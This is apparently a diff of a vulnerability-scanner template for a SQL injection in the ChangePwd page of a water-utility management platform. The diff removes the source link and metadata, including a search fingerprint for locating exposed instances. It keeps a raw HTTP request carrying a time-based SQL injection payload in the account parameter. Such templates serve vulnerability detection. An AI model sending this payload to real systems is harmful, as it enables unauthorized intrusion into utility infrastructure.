@@ -3,12 +3,8 @@ info:
   name: 潍微科技 水务信息管理平台 ChangePwd SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ga0o3xs50eeipga1'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ga0o3xs50eeipga1
-    fofa: icon_hash="-491165370"
 http:
 - raw:
   - 'GET /Account/ChangePwd?oldpwd=123456&newpwd=123456&conpwd=123456&account=1%27;waitfor%20delay%20%270:0:5%27--+ HTTP/1.1
